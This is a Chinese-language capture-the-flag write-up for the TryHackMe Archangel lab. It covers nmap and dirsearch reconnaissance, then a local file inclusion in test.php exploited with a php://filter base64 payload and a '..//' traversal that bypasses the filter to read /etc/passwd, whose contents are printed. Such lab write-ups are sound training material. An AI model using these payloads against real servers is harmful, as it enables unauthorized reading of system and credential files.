# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 发现服务
```
┌──(root💀kali)-[~/tryhackme/Archangel]
└─# nmap -sV -Pn 10.10.3.191     
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-29 05:43 EDT
Nmap scan report for 10.10.3.191
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
```

# 渗透80端口 
## 爆破目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.3.191                                                                        

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.3.191/_21-10-29_06-02-36.txt

Error Log: /root/dirsearch/logs/errors-21-10-29_06-02-36.log

Target: http://10.10.3.191/

[06:02:37] Starting:                                         
[06:03:59] 301 -  312B  - /flags  ->  http://10.10.3.191/flags/            
[06:04:06] 301 -  313B  - /images  ->  http://10.10.3.191/images/          
[06:04:06] 200 -    0B  - /images/                                          
[06:04:08] 200 -   19KB - /index.html                                       
[06:04:29] 301 -  312B  - /pages  ->  http://10.10.3.191/pages/            
[06:04:30] 200 -    0B  - /pages/                                           
[06:04:44] 403 -  277B  - /server-status    
```

/flags 转向youtube一个视频，没有其他信息，应该是个兔子洞
其他文件夹没有其他信息

查看网页源代码，在```Send us a mail```里发现一个域名，把```mafialive.thm```写进host文件

echo "10.10.3.191 mafialive.thm" >> /etc/hosts

打开mafialive.thm发现flag1

再次爆破目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://mafialive.thm 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/mafialive.thm/_21-11-01_06-52-00.txt

Error Log: /root/dirsearch/logs/errors-21-11-01_06-52-00.log

Target: http://mafialive.thm/

[06:52:01] Starting: 
[06:53:22] 200 -   59B  - /index.html                                       
[06:53:50] 200 -   34B  - /robots.txt                                                                          
[06:54:02] 200 -  286B  - /test.php   
```

打开test.php，点击网页buttom，url显示出一串路径，修改路径文件名可以访问服务器一些文件的内容，说明存在LFI漏洞


我们用php伪协议输出整个网页的源代码，payloadr如下

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
打印出了test.php的源代码，拿到flag2

审阅上传代码
```
<?php
 function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }

	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
 ?>
```

只有满足不出现```../..```和一定出现```/var/www/html/development_testing```这两个字符串的条件下，包含逻辑才会生效

我们用```//```代替```/```就可以绕过不能出现```../..```的限制，读取```/etc/passwd```payload如下

```
/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//etc/passwd 
```

解密以后得到用户名
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash

```

由上面可知存在用户archangel

 